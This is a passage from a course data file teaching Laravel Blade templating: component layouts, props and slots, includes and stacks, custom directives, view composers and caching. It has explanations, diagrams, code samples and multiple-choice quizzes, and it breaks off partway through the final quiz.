        "The mental models differ: inheritance <b>pulls</b> from named sections, components <b>push</b> into slots.",
        "Neither is deprecated. Pick the component layout if your UI already uses Blade components.",
        "<b>Never mix both in one page.</b>",
        "`@section` does not work inside a component; use named slots. And `@yield` renders immediately, so it cannot defer work.",
      ],
      commonMistakes: [
        "<b>Mixing `@extends` and `<x-layout>` in the same template.</b> Two layout systems in one file is confusing and subtly breakable.",
        "<b>Using `@section` inside a component layout.</b> Sections belong to the inheritance system; components use slots.",
        "<b>Forgetting `@endsection` or `@endforeach`.</b> Blade's error points at the compiled file, so the message rarely names the line you need.",
        "<b>Putting page-specific scripts in a section.</b> Stacks exist for exactly that and compose properly.",
        "<b>Converting a working `@extends` layout for the sake of modernity.</b> Both are supported; the churn buys nothing.",
      ],
      quiz: [
        {
          question: "In template inheritance, what does `@yield('content')` do?",
          options: [
            "Marks where the child's matching `@section` is inserted",
            "Defines content",
            "Includes another view",
            "Creates a component",
          ],
          correctIndex: 0,
          explanation: "The layout pulls content from named sections.",
        },
        {
          question: "How does a page pass its main content to a component layout?",
          options: [
            "With `@section`",
            "With `@yield`",
            "With `@include`",
            "As `$slot`",
          ],
          correctIndex: 3,
          explanation: "Anything between the opening and closing tags becomes `$slot`.",
        },
        {
          question: "What does `@parent` do?",
          options: [
            "Extends a layout",
            "Keeps the layout's version of the section and adds to it",
            "Calls the parent controller",
            "References the outer loop",
          ],
          correctIndex: 1,
          explanation: "Useful when a page should add to a default sidebar rather than replace it.",
        },
        {
          question: "Why should you not use `@section` inside a component layout?",
          options: [
            "It is slower",
            "It only works in the layout",
            "It causes an infinite loop",
            "Sections belong to the inheritance system; components use slots",
          ],
          correctIndex: 3,
          explanation: "Named slots are the component equivalent.",
        },
      ],
    },
    {
      id: "components",
      title: "Blade components, props and slots",
      durationMinutes: 13,
      explanation: "A <b>component</b> is a reusable piece of interface: a button, a badge, an alert, a card.\n\nA <b>prop</b> is a value a component declares that it expects to be given. A <b>slot</b> is the content passed between the component's opening and closing tags. Those two do most of the work in this lesson.\n\n---\n\n### 1. Basic — anonymous components\n\nThe simplest kind is a Blade file with no PHP class at all. Put it in `resources/views/components/`:\n\n```blade\n{{-- resources/views/components/alert.blade.php --}}\n<div class=\"alert\">\n    {{ $slot }}\n</div>\n```\n\nUse it:\n\n```blade\n<x-alert>\n    Something went wrong.\n</x-alert>\n```\n\n`$slot` holds whatever went between the tags. The filename becomes the tag name, and nesting maps to dots:\n\n```text\ncomponents/alert.blade.php         → <x-alert>\ncomponents/forms/input.blade.php   → <x-forms.input>\n```\n\nMost components you write never need a class. Start here.\n\n---\n\n### 2. Intermediate — props and attributes\n\nDeclare the data a component expects with `@props`, giving defaults where sensible:\n\n```blade\n{{-- resources/views/components/alert.blade.php --}}\n@props(['type' => 'info', 'dismissible' => false])\n\n<div class=\"alert alert-{{ $type }}\">\n    {{ $slot }}\n\n    @if ($dismissible)\n        <button>&times;</button>\n    @endif\n</div>\n```\n\n```blade\n<x-alert type=\"error\">Payment failed.</x-alert>\n<x-alert :type=\"$status\" :dismissible=\"true\">Saved.</x-alert>\n```\n\nThe colon is the important bit. Without it you pass a <b>string</b>; with it you pass a <b>PHP expression</b>:\n\n```blade\ntype=\"error\"        the string \"error\"\n:type=\"$status\"     the value of $status\n:dismissible=\"true\" the boolean true, not the string \"true\"\n```\n\nForgetting the colon on a boolean is a classic: `dismissible=\"false\"` passes the non-empty string `\"false\"`, which is truthy, so the button appears anyway.\n\nAnything not declared in `@props` lands in `$attributes`, and `merge` combines it with your defaults:\n\n```blade\n@props(['type' => 'info'])\n\n<div {{ $attributes->merge(['class' => 'alert alert-'.$type]) }}>\n    {{ $slot }}\n</div>\n```\n\n```blade\n<x-alert class=\"mt-4\" id=\"save-alert\">Saved.</x-alert>\n```\n\nThe rendered `class` is `alert alert-info mt-4`, and `id` passes through untouched. That is what makes a component reusable rather than rigid: callers can add to it without you predicting every attribute.\n\nRelated helpers:\n\n```blade\n{{ $attributes->class(['alert', 'alert-error' => $type === 'error']) }}\n{{ $attributes->except('class') }}\n{{ $attributes->only('id') }}\n```\n\n---\n\n### 3. Advanced — named slots, class components and `@aware`\n\nOne `$slot` is often not enough. <b>Named slots</b> give a component several insertion points:\n\n```blade\n{{-- resources/views/components/card.blade.php --}}\n<div class=\"card\">\n    @isset($header)\n        <div class=\"card-header\">{{ $header }}</div>\n    @endisset\n\n    <div class=\"card-body\">{{ $slot }}</div>\n\n    @isset($footer)\n        <div class=\"card-footer\">{{ $footer }}</div>\n    @endisset\n</div>\n```\n\n```blade\n<x-card>\n    <x-slot:header>Invoice INV-001</x-slot:header>\n\n    <p>Total: $500</p>\n\n    <x-slot:footer>\n        <button>Pay</button>\n    </x-slot:footer>\n</x-card>\n```\n\nWrap optional slots in `@isset` so a missing one does not render an empty wrapper.\n\nWhen a component needs real logic, generate a <b>class component</b>:\n\n```bash\nphp artisan make:component InvoiceStatus\n```\n\nThat creates `app/View/Components/InvoiceStatus.php` and `resources/views/components/invoice-status.blade.php`. The class computes; the template displays:\n\n```php\nclass InvoiceStatus extends Component\n{\n    public function __construct(public string $status) {}\n\n    public function colour(): string\n    {\n        return match ($this->status) {\n            'paid' => 'green',\n            'sent' => 'blue',\n            default => 'grey',\n        };\n    }\n\n    public function render(): View\n    {\n        return view('components.invoice-status');\n    }\n}\n```\n\nPublic properties and methods are available in the template. Note the naming: `InvoiceStatus` becomes `<x-invoice-status>`, so the class is StudlyCase and the tag is kebab-case.\n\nFinally, <b>`@aware`</b> lets a child read a prop given to its parent:\n\n```blade\n{{-- components/menu.blade.php --}}\n@props(['colour' => 'blue'])\n<ul {{ $attributes }}>{{ $slot }}</ul>\n\n{{-- components/menu/item.blade.php --}}\n@aware(['colour' => 'blue'])\n<li class=\"text-{{ $colour }}\">{{ $slot }}</li>\n```\n\n```blade\n<x-menu colour=\"red\">\n    <x-menu.item>Invoices</x-menu.item>\n</x-menu>\n```\n\nThe item picks up `red` without it being passed down by hand. The catch, which is easy to trip over: `@aware` only reads props the parent received <i>as attributes</i>. A value the parent computed internally is not visible.",
      diagram: `Anonymous components: a file is enough

  resources/views/components/alert.blade.php   →  <x-alert>
  resources/views/components/forms/input...    →  <x-forms.input>

  Most components never need a PHP class. Start here.


The colon changes everything

  type="error"          the STRING "error"
  :type="$status"       the VALUE of $status
  :dismissible="true"   the BOOLEAN true

  dismissible="false"   the string "false"  ← truthy!
                        the button appears anyway


Props vs attributes

  @props(['type' => 'info'])        declared → your variables
  everything else                    → $attributes

  <x-alert type="error" class="mt-4" id="a">
            └─ prop ─┘   └── attributes ──┘

  {{ $attributes->merge(['class' => 'alert']) }}
              ↓
  class="alert mt-4"  id="a"

  Callers extend the component without you
  predicting every attribute.


Named slots

  <x-card>
      <x-slot:header>  →  {{ $header }}
      ...content...    →  {{ $slot }}
      <x-slot:footer>  →  {{ $footer }}
  </x-card>

  Wrap optional ones in @isset, or you render empty wrappers.`,
      codeExample: {
        title: "Anonymous, class-based, slots and @aware",
        code: `{{-- ---------- Anonymous component with props ---------- --}}
{{-- resources/views/components/alert.blade.php --}}
@props(['type' => 'info', 'dismissible' => false])

<div {{ $attributes->merge(['class' => 'alert alert-'.$type]) }}>
    {{ $slot }}

    @if ($dismissible)
        <button type="button">&times;</button>
    @endif
</div>


{{-- Using it --}}
<x-alert>Saved.</x-alert>
<x-alert type="error">Payment failed.</x-alert>

{{-- The colon passes a PHP expression, not a string --}}
<x-alert :type="$invoice['status']" :dismissible="true">Saved.</x-alert>

{{-- WRONG: "false" is a non-empty string, so this is truthy
     and the dismiss button renders anyway. --}}
<x-alert dismissible="false">Careful.</x-alert>

{{-- Extra attributes merge with the component's own --}}
<x-alert class="mt-4" id="save-alert">Saved.</x-alert>
{{-- renders: class="alert alert-info mt-4" id="save-alert" --}}


{{-- ---------- Named slots ---------- --}}
{{-- resources/views/components/card.blade.php --}}
<div class="card">
    @isset($header)
        <div class="card-header">{{ $header }}</div>
    @endisset

    <div class="card-body">{{ $slot }}</div>

    @isset($footer)
        <div class="card-footer">{{ $footer }}</div>
    @endisset
</div>

<x-card>
    <x-slot:header>Invoice INV-001</x-slot:header>

    <p>Total: $500</p>

    <x-slot:footer>
        <button>Pay</button>
    </x-slot:footer>
</x-card>

<?php
// ---------- Class component, for real logic ----------
// php artisan make:component InvoiceStatus
// InvoiceStatus  →  <x-invoice-status>   (StudlyCase → kebab-case)

namespace App\\View\\Components;

use Illuminate\\View\\Component;
use Illuminate\\Contracts\\View\\View;

class InvoiceStatus extends Component
{
    public function __construct(public string $status) {}

    // Public methods are callable from the template.
    public function colour(): string
    {
        return match ($this->status) {
            'paid'  => 'green',
            'sent'  => 'blue',
            default => 'grey',
        };
    }

    public function render(): View
    {
        return view('components.invoice-status');
    }
}
?>

{{-- resources/views/components/invoice-status.blade.php --}}
<span class="badge badge-{{ $colour() }}">{{ ucfirst($status) }}</span>

{{-- <x-invoice-status :status="$invoice['status']" /> --}}


{{-- ---------- @aware: a child reading the parent's prop ---------- --}}
{{-- components/menu.blade.php --}}
@props(['colour' => 'blue'])
<ul {{ $attributes }}>{{ $slot }}</ul>

{{-- components/menu/item.blade.php --}}
{{-- Only sees props the PARENT received as attributes,
     not values the parent computed itself. --}}
@aware(['colour' => 'blue'])
<li class="text-{{ $colour }}">{{ $slot }}</li>

{{-- <x-menu colour="red"><x-menu.item>Invoices</x-menu.item></x-menu> --}}`,
      },
      keyTakeaways: [
        "An <b>anonymous component</b> is just a file in `resources/views/components/`. Most components need nothing more.",
        "The filename becomes the tag: `alert.blade.php` is `<x-alert>`, `forms/input.blade.php` is `<x-forms.input>`.",
        "<b>`@props`</b> declares expected data with defaults; anything undeclared lands in `$attributes`.",
        "<b>The colon matters</b>: `type=\"x\"` passes a string, `:type=\"$x\"` passes a PHP value.",
        "`dismissible=\"false\"` passes the truthy string `\"false\"`. Booleans need the colon.",
        "<b>`$attributes->merge([...])`</b> combines caller attributes with the component's own, which is what makes it reusable.",
        "<b>Named slots</b> give several insertion points; wrap optional ones in `@isset`.",
        "`php artisan make:component` creates a class when you need logic; `InvoiceStatus` becomes `<x-invoice-status>`.",
        "<b>`@aware`</b> lets a child read a parent's prop, but only one passed as an attribute.",
      ],
      commonMistakes: [
        "<b>Passing a boolean without the colon.</b> `dismissible=\"false\"` is a non-empty string, so every check treats it as true.",
        "<b>Rendering `{{ $attributes }}` and also hard-coding `class`.</b> You end up with two class attributes and the browser keeps one.",
        "<b>Reaching for a class component by default.</b> Most components are presentational and an anonymous file is less to maintain.",
        "<b>Not guarding optional named slots.</b> A missing `$footer` renders an empty wrapper div with its border and padding.",
        "<b>Expecting `@aware` to see a computed value.</b> It only reads props the parent received as attributes.",
        "<b>Getting the tag name wrong.</b> `InvoiceStatus` is `<x-invoice-status>`, not `<x-InvoiceStatus>`.",
      ],
      quiz: [
        {
          question: "What is the difference between `type=\"error\"` and `:type=\"$status\"`?",
          options: [
            "None",
            "The colon escapes the value",
            "The colon is for class components",
            "The colon passes a PHP expression instead of a literal string",
          ],
          correctIndex: 3,
          explanation: "Which is why booleans need `:dismissible=\"true\"`.",
        },
        {
          question: "Why does `dismissible=\"false\"` not work as expected?",
          options: [
            "Blade cannot parse it",
            "It passes the string \"false\", which is truthy",
            "It needs `@props`",
            "Booleans are unsupported",
          ],
          correctIndex: 1,
          explanation: "Use `:dismissible=\"false\"` to pass the actual boolean.",
        },
        {
          question: "What does `$attributes->merge(['class' => 'alert'])` achieve?",
          options: [
            "Replaces caller attributes",
            "Combines the component's defaults with whatever the caller passed",
            "Escapes the attributes",
            "Validates them",
          ],
          correctIndex: 1,
          explanation: "That is what lets a caller add `class=\"mt-4\"` without you anticipating it.",
        },
        {
          question: "What is the tag for a component class named `InvoiceStatus`?",
          options: [
            "`<x-invoice-status>`",
            "`<x-invoice_status>`",
            "`<x-InvoiceStatus>`",
            "`<x-invoicestatus>`",
          ],
          correctIndex: 0,
          explanation: "StudlyCase class names become kebab-case tags.",
        },
      ],
    },
    {
      id: "includes-and-stacks",
      title: "Includes, @each and stacks",
      durationMinutes: 11,
      explanation: "Two more ways to break a page into pieces, and one for getting scripts into the layout.\n\nAn <b>include</b> drops another Blade file in place, and the included file shares the including view's variables. A <b>stack</b> is a named placeholder in the layout that child views and components push content onto, which is how a page gets its own scripts into the head or footer.\n\n---\n\n### 1. Basic — includes\n\n`@include` drops another Blade file in place:\n\n```blade\n@include('partials.invoice-summary')\n```\n\nAn included file <b>inherits every variable</b> from the view that included it, which is the main difference from a component. You can also pass extra data:\n\n```blade\n@include('partials.invoice-row', ['invoice' => $invoice, 'showActions' => true])\n```\n\nConditional variants:\n\n```blade\n@includeIf('partials.banner')                        {{-- skip if missing --}}\n@includeWhen($user->isAdmin(), 'partials.admin-bar')\n@includeUnless($invoice['paid'], 'partials.pay-button')\n@includeFirst(['custom.header', 'partials.header'])  {{-- first that exists --}}\n```\n\n`@each` renders one view per item, with a built-in empty case:\n\n```blade\n@each('partials.invoice-row', $invoices, 'invoice', 'partials.no-invoices')\n```\n\n```text\n   view to render    the items    variable name    view if empty\n```\n\n---\n\n### 2. Intermediate — include or component?\n\nThey overlap, and the choice is not arbitrary.\n\n```text\n@include                          <x-component>\n────────                          ─────────────\ninherits ALL parent variables     receives only what you pass\nno declared interface             @props says what it needs\nno attribute merging              $attributes merges\na fragment of this page           a reusable piece of UI\n```\n\nThat first row is the real difference. An include silently depends on whatever happened to be in scope, so moving it to another page can break it with a message about an undefined variable. A component's `@props` line states its interface, so it works wherever you use it.\n\nA reasonable rule:\n\n```text\nUsed in one page, splitting a long template  →  @include\nUsed in several places, or with a real API   →  component\n```\n\nComponents are the better default for anything reusable. Includes are fine for cutting a 300-line template into readable pieces.\n\n---\n\n### 3. Advanced — stacks\n\nA page often needs a script or stylesheet that the layout knows nothing about. You cannot put it in `@section('content')`, because it belongs in `<head>` or at the end of `<body>`.\n\n<b>Stacks</b> solve this. The layout declares a named place:\n\n```blade\n<head>\n    @stack('styles')\n</head>\n<body>\n    ...\n    @stack('scripts')\n</body>\n```\n\nAny page or component pushes into it:\n\n```blade\n@push('scripts')\n    <script src=\"/js/invoice-chart.js\"></script>\n@endpush\n```\n\n```text\nchild view\n    │ @push('scripts')\n    ↓\n\"scripts\" stack\n    │\n    ↓\nlayout: @stack('scripts')   →  rendered in <body>\n```\n\n`@prepend` puts content at the front, for something that must load first:\n\n```blade\n@prepend('scripts')\n    <script src=\"/js/vendor.js\"></script>\n@endprepend\n```\n\nThe reason stacks matter more than they first appear: <b>components can push too</b>. A date-picker component can push its own JavaScript into the layout's script stack, so using the component is all a page has to do. Nothing has to remember to add the script.\n\nWhich raises the obvious problem. Use that component five times on one page and the script is pushed five times. `@once` fixes it:\n\n```blade\n@once\n    @push('scripts')\n        <script src=\"/js/datepicker.js\"></script>\n    @endpush\n@endonce\n```\n\n`@once` renders its contents a single time per request, however many times the surrounding template runs. There is also `@pushOnce`, which is the same idea in one directive:\n\n```blade\n@pushOnce('scripts')\n    <script src=\"/js/datepicker.js\"></script>\n@endPushOnce\n```\n\nThat pairing, a component that carries its own assets and pushes them once, is what makes a component library genuinely self-contained.",
      diagram: `@include inherits scope; a component does not

  @include('partials.row')          <x-invoice-row :invoice="$invoice" />
        │                                    │
  sees EVERY variable in the        sees only what you passed;
  including view                    @props declares its interface
        │                                    │
  move it elsewhere → may           works anywhere
  break on an undefined variable

  One page, splitting a long file  →  @include
  Reused, or with a real API       →  component


Stacks: pushing into the layout from anywhere

  invoices/index.blade.php          components/date-picker.blade.php
      @push('scripts')                  @pushOnce('scripts')
        chart.js                          datepicker.js
      @endpush                          @endPushOnce
          │                                   │
          └───────────────┬───────────────────┘
                          ↓
                   "scripts" stack
                          ↓
  layouts/app.blade.php:  @stack('scripts')
                          ↓
                    rendered once, in <body>

  @push     → end of the stack
  @prepend  → front of the stack (loads first)


The duplicate problem

  <x-date-picker /> used 5 times
            ↓
  @push  → the script tag appears 5 times
  @once / @pushOnce → once per request`,
      codeExample: {
        title: "Includes, @each, and a self-contained component",
        code: `{{-- ---------- Includes ---------- --}}

{{-- Inherits every variable in scope here --}}
@include('partials.invoice-summary')

{{-- Plus extra data of its own --}}
@include('partials.invoice-row', ['invoice' => $invoice, 'showActions' => true])

{{-- Conditional variants --}}
@includeIf('partials.banner')                          {{-- skip if missing --}}
@includeWhen(auth()->user()?->isAdmin(), 'partials.admin-bar')
@includeUnless($invoice['paid'], 'partials.pay-button')
@includeFirst(['custom.header', 'partials.header'])    {{-- first that exists --}}

{{-- One view per item, with a built-in empty case --}}
@each('partials.invoice-row', $invoices, 'invoice', 'partials.no-invoices')


{{-- ---------- The layout declares the stacks ---------- --}}
{{-- resources/views/layouts/app.blade.php --}}
<!DOCTYPE html>
<html>
<head>
    <title>@yield('title', 'InvoiceHub')</title>
    @stack('styles')
</head>
<body>
    <main>@yield('content')</main>

    <script src="/js/app.js"></script>
    @stack('scripts')
</body>
</html>


{{-- ---------- A page pushing its own assets ---------- --}}
{{-- resources/views/invoices/index.blade.php --}}
@extends('layouts.app')

@section('content')
    <h1>Invoices</h1>
    <canvas id="invoice-chart"></canvas>

    <x-date-picker name="from" />
    <x-date-picker name="to" />
@endsection

@push('styles')
    <link rel="stylesheet" href="/css/invoices.css">
@endpush

@push('scripts')
    <script src="/js/invoice-chart.js"></script>
@endpush

{{-- Must load before everything else in the stack --}}
@prepend('scripts')
    <script src="/js/vendor.js"></script>
@endprepend


{{-- ---------- A component that carries its own script ---------- --}}
{{-- resources/views/components/date-picker.blade.php --}}
@props(['name'])

<input type="text" name="{{ $name }}" class="date-picker">

{{-- Used twice on the page above. Without @pushOnce the script tag
     would appear twice. --}}
@pushOnce('scripts')
    <script src="/js/datepicker.js"></script>
@endPushOnce

{{-- The longer equivalent:
@once
    @push('scripts')
        <script src="/js/datepicker.js"></script>
    @endpush
@endonce
--}}`,
      },
      keyTakeaways: [
        "<b>`@include`</b> renders another Blade file and <b>inherits every variable</b> in scope.",
        "`@includeIf`, `@includeWhen`, `@includeUnless` and `@includeFirst` cover the conditional cases.",
        "<b>`@each`</b> renders one view per item and takes a fourth argument for the empty case.",
        "An include has <b>no declared interface</b>; a component's `@props` states what it needs.",
        "Use includes to split one long template; use components for anything reused.",
        "<b>`@stack`</b> declares a named place in the layout; <b>`@push`</b> and `@prepend` add to it from anywhere.",
        "Components can push their own scripts, which makes them self-contained.",
        "<b>`@once` / `@pushOnce`</b> stop a repeated component pushing the same asset several times.",
      ],
      commonMistakes: [
        "<b>Relying on an include inheriting a variable.</b> Move it to another page and it breaks with an undefined variable error.",
        "<b>Using an include for something reused across pages.</b> With no `@props`, nothing documents what it needs.",
        "<b>Pushing a script from a component without `@once`.</b> Render it five times and the tag appears five times.",
        "<b>Forgetting `@stack` in the layout.</b> Everything pushed is silently discarded, with no error to explain the missing script.",
        "<b>Putting scripts in `@section('content')`.</b> They end up in the middle of the page rather than where the layout wants them.",
        "<b>Mismatching the closing directive.</b> `@pushOnce` closes with `@endPushOnce`, which is easy to mistype.",
      ],
      quiz: [
        {
          question: "What is the main difference between `@include` and a component?",
          options: [
            "Speed",
            "Components cannot be nested",
            "Includes cannot take data",
            "An include inherits all parent variables; a component receives only what you pass",
          ],
          correctIndex: 3,
          explanation: "Which is why an include can break when moved to another page.",
        },
        {
          question: "What does `@stack('scripts')` do?",
          options: [
            "Pushes a script",
            "Declares a place in the layout where pushed content is rendered",
            "Loads all scripts",
            "Caches scripts",
          ],
          correctIndex: 1,
          explanation: "Pages and components then push into it with `@push`.",
        },
        {
          question: "A component used five times pushes its script five times. What fixes it?",
          options: [
            "`@prepend`",
            "`@once` or `@pushOnce`",
            "`@includeFirst`",
            "`@each`",
          ],
          correctIndex: 1,
          explanation: "It renders its contents a single time per request.",
        },
        {
          question: "You push to a stack and nothing appears. What is the likely cause?",
          options: [
            "You need `@prepend`",
            "The script is cached",
            "The layout has no matching `@stack`",
            "Stacks only work in components",
          ],
          correctIndex: 2,
          explanation: "Pushed content is silently discarded when nothing renders the stack.",
        },
      ],
    },
    {
      id: "directives-and-composers",
      title: "Custom directives, view composers and caching",
      durationMinutes: 12,
      explanation: "The last group: extending Blade, feeding data to views automatically, and understanding the compiled cache.\n\nA <b>custom directive</b> is your own `@something`, registered with `Blade::directive`. A <b>view composer</b> is a callback that attaches data to a view every time it renders, so a controller does not have to pass it. The <b>compiled view cache</b> is the plain PHP that Blade generates from your templates, kept in `storage/framework/views/`.\n\n---\n\n### 1. Basic — inline PHP, injection and JSON\n\n`@php` runs PHP in a template:\n\n```blade\n@php\n    $total = $subtotal + $tax;\n@endphp\n```\n\nIt works, and a long one is a signal the controller should have done the work.\n\n`@inject` pulls a service out of the container:\n\n```blade\n@inject('metrics', 'App\\Services\\MetricsService')\n\n<p>{{ $metrics->invoicesThisMonth() }}</p>\n```\n\nUse it sparingly. A view that resolves its own services has hidden dependencies: nothing in the controller or the route says the template needs a `MetricsService`, so a change to that class breaks a page nobody thought to check.\n\n`@json` you met in lesson two, and it is the correct way to hand data to JavaScript.\n\n---\n\n### 2. Intermediate — custom directives\n\nWhen a formatting pattern repeats across many templates, you can add your own directive. Register it in a service provider's `boot()`:\n\n```php\npublic function boot(): void\n{\n    Blade::directive('money', function (string $expression) {\n        return \"<?php echo number_format($expression, 2); ?>\";\n    });\n}\n```\n\n```blade\n<td>@money($invoice['total'])</td>\n```\n\nThe thing to understand: your closure runs at <b>compile</b> time, not render time. It receives the expression as a <i>string</i> and must return a string of PHP code. That is why you cannot inspect the value inside the directive; it does not exist yet.\n\n`Blade::if` is simpler and covers most cases:\n\n```php\nBlade::if('admin', fn () => auth()->user()?->isAdmin() ?? false);\n```\n\n```blade\n@admin\n    <a href=\"{{ route('admin.invoices.index') }}\">Admin</a>\n@endadmin\n```\n\nKeep both small. A custom directive that contains business logic hides that logic in a service provider, where nobody looks.\n\nTwo practical notes: after adding or changing a directive, run `php artisan view:clear`, because already-compiled templates still hold the old output. And an anonymous component often does the same job more clearly than a directive.\n\n---\n\n### 3. Advanced — view composers, and the cache\n\nSome data belongs on a view every time it renders. Unread notification counts in the navigation, for example. Passing it from every controller is repetitive and easy to forget.\n\nA <b>view composer</b> (a callback that runs whenever a given view renders, and adds data to it) handles that:\n\n```php\n// In a service provider's boot()\nView::composer('layouts.app', function ($view) {\n    $view->with('unreadCount', auth()->user()?->unreadNotifications()->count() ?? 0);\n});\n```\n\nNow `$unreadCount` exists in that layout no matter which controller rendered it. Wildcards work too:\n\n```php\nView::composer(['invoices.*'], InvoiceComposer::class);\nView::composer('*', GlobalComposer::class);        // every view\n```\n\nFor anything non-trivial use a class, which the container resolves, so it can take constructor dependencies:\n\n```php\nclass InvoiceComposer\n{\n    public function __construct(private InvoiceStore $invoices) {}\n\n    public function compose(View $view): void\n    {\n        $view->with('recentInvoices', $this->invoices->recent());\n    }\n}\n```\n\nThe honest trade-off: a composer makes data appear in a template with nothing in the controller to explain it. That is convenient and it is also how a page gains a mystery variable. Use them for genuinely global things like navigation counts, not as a way to avoid passing data.\n\n<b>View creators</b> are the same mechanism, registered with `View::creator()`, but they run when the view is instantiated rather than just before it renders. The difference matters rarely.\n\nFinally, caching. Blade compiles to PHP in `storage/framework/views/` and recompiles when the source changes, so development needs no thought. For production, precompile at deploy:\n\n```bash\nphp artisan view:cache      # compile everything up front\nphp artisan view:clear      # remove compiled views\n```\n\n`php artisan optimize` runs this along with the route and config caches, and `optimize:clear` undoes all of them. When a template change stubbornly refuses to appear, `view:clear` is the first thing to try.",
      diagram: `A custom directive runs at COMPILE time

  Blade::directive('money', function ($expression) {
      return "<?php echo number_format($expression, 2); ?>";
  });                              │
                                   └── a STRING of code, not a value

  @money($invoice['total'])
            ↓ compile
  <?php echo number_format($invoice['total'], 2); ?>
            ↓ render
         1,250.00

  Changed a directive? php artisan view:clear
  Already-compiled templates hold the old output.


View composer: data that appears by itself

  any controller renders layouts.app
              ↓
        View::composer('layouts.app', ...)
              ↓
        adds $unreadCount
              ↓
        the template has it

  Convenient, and the reason a template can gain a
  variable with nothing in the controller to explain it.
  Use for navigation counts, not to avoid passing data.


The compiled cache

  invoices/index.blade.php
        ↓ compile (source changed)
  storage/framework/views/a3f9c2....php
        ↓ execute

  view:cache   precompile everything (deploy)
  view:clear   throw the compiled files away
  optimize     view + route + config caches together`,
      codeExample: {
        title: "Directives, composers and the cache",
        code: `<?php
// app/Providers/AppServiceProvider.php

namespace App\\Providers;

use Illuminate\\Support\\Facades\\Blade;
use Illuminate\\Support\\Facades\\View;
use Illuminate\\Support\\ServiceProvider;

class AppServiceProvider extends ServiceProvider
{
    public function boot(): void
    {
        // ---------- A custom directive ----------
        // The closure runs at COMPILE time and receives the expression
        // as a string. It must RETURN a string of PHP code.
        Blade::directive('money', function (string $expression) {
            return "<?php echo number_format($expression, 2); ?>";
        });

        // ---------- A custom conditional ----------
        Blade::if('admin', function () {
            return auth()->user()?->isAdmin() ?? false;
        });

        // ---------- View composers ----------
        // Runs whenever this view renders, whichever controller did it.
        View::composer('layouts.app', function ($view) {
            $view->with(
                'unreadCount',
                auth()->user()?->unreadNotifications()->count() ?? 0,
            );
        });

        // A class, resolved through the container, so it can take
        // constructor dependencies.
        View::composer(['invoices.*'], \\App\\View\\Composers\\InvoiceComposer::class);

        // Every view in the application.
        // View::composer('*', \\App\\View\\Composers\\GlobalComposer::class);

        // Same idea, but when the view is INSTANTIATED rather than rendered.
        // View::creator('invoices.index', \\App\\View\\Creators\\InvoiceCreator::class);
    }
}


// app/View/Composers/InvoiceComposer.php
namespace App\\View\\Composers;

use App\\Services\\InvoiceStore;
use Illuminate\\View\\View;

class InvoiceComposer
{
    public function __construct(private InvoiceStore $invoices) {}

    public function compose(View $view): void
    {
        $view->with('recentInvoices', $this->invoices->recent());
    }
}
?>

{{-- ---------- Using them ---------- --}}

<td>@money($invoice['total'])</td>          {{-- 1,250.00 --}}

@admin
    <a href="{{ route('admin.invoices.index') }}">Admin</a>
@endadmin

{{-- $unreadCount came from the composer, not from any controller --}}
<span class="badge">{{ $unreadCount }}</span>

{{-- @inject: convenient, but the dependency is invisible to the
     controller and the route. Use sparingly. --}}
@inject('metrics', 'App\\Services\\MetricsService')
<p>{{ $metrics->invoicesThisMonth() }}</p>

{{-- @php works. A long one means the controller should have done it. --}}
@php
    $total = $subtotal + $tax;
@endphp

# ---------- Deployment ----------
# php artisan view:cache      compile every template up front
# php artisan view:clear      throw the compiled files away
# php artisan optimize        view + route + config caches
# php artisan optimize:clear  undo all of them`,
      },
      keyTakeaways: [
        "<b>`@php`</b> runs inline PHP; a long block means the controller should have prepared the data.",
        "<b>`@inject`</b> resolves a service in a template, but hides the dependency from the controller and route.",
        "<b>`Blade::directive`</b> runs at <b>compile time</b>: it receives an expression string and returns PHP code.",
        "<b>`Blade::if`</b> is the simpler tool for a custom conditional and covers most cases.",
        "Run <b>`view:clear` after changing a directive</b>, or compiled templates keep the old output.",
        "A <b>view composer</b> adds data whenever a given view renders, and supports wildcards like `invoices.*`.",
        "Composers are resolved through the container, so a composer class can take constructor dependencies.",
        "The trade-off: a composer makes a variable appear with nothing in the controller to explain it. Use it for global things.",
        "<b>`view:cache`</b> precompiles for production; `view:clear` is the first thing to try when a change will not appear.",
      ],
      commonMistakes: [
        "<b>Returning a value from `Blade::directive` instead of PHP code.</b> It runs at compile time, so it must return a string of code.",
        "<b>Forgetting `view:clear` after editing a directive.</b> Compiled templates still hold the old generated PHP.",
        "<b>Putting business logic in a directive.</b> It ends up hidden in a service provider where nobody thinks to look.",
        "<b>Using composers to avoid passing data.</b> Templates then depend on variables with no visible source.",
        "<b>Registering `View::composer('*', ...)` with an expensive query.</b> It now runs for every view in the application.",
        "<b>Relying on `@inject` in many templates.</b> Changing that service breaks pages nothing links it to.",
      ],
      quiz: [
        {
          question: "When does the closure passed to `Blade::directive` run?",
          options: [
            "At compile time, returning a string of PHP code",
            "On every render",
            "When the app boots",
            "Only in production",
          ],
          correctIndex: 0,
          explanation: "Which is why it cannot inspect the value; it does not exist yet.",
        },
        {
          question: "What must you do after changing a custom directive?",
          options: [
            "Restart the server",
            "`composer dump-autoload`",
            "`php artisan view:clear`",
            "Nothing",
          ],
          correctIndex: 2,
          explanation: "Already-compiled templates still contain the old generated PHP.",
        },
        {
          question: "What does a view composer do?",
          options: [
            "Creates a view file",
            "Compiles templates",
            "Adds data to a view whenever it renders, from anywhere",
            "Caches a view",
          ],
          correctIndex: 2,
          explanation: "Useful for global things like a navigation notification count.",
        },
        {
          question: "What is the drawback of view composers?",
          options: [
            "They are slow",
            "They only work on layouts",
            "They break caching",
            "A template gains a variable with nothing in the controller to explain it",
          ],
          correctIndex: 3,
          explanation: "Which is why they suit genuinely global data rather than ordinary page data.",
        },
      ],
    },
  ],
  finalQuiz: [
    {
      question: "How do you refer to `resources/views/invoices/index.blade.php`?",
      options: [
        "`invoices.index`",
        "`invoices/index`",
        "`views.invoices.index`",
        "`index.blade.php`",
      ],
      correctIndex: 0,
      explanation: "Slashes in the path become dots in the name.",
    },
    {
      question: "What does Laravel do with a Blade template?",
      options: [
        "Interprets it every request",
        "Compiles it to plain PHP and caches the result",
        "Serves it directly",
        "Converts it to JavaScript",
      ],
      correctIndex: 1,
      explanation: "Which is why directives cost essentially nothing at runtime.",
    },
    {
      question: "Which of these belongs in a controller, not a template?",
      options: [
        "Looping over invoices",
        "Choosing a CSS class",
        "Running the query that fetches them",
        "Formatting a date",
      ],
      correctIndex: 2,
      explanation: "A template may read data and decide how to show it, not fetch it.",
    },
    {
      question: "What is the difference between `{{ }}` and `{!! !!}`?",
      options: [
        "`{!! !!}` is faster",
        "`{{ }}` escapes HTML; `{!! !!}` prints it raw",
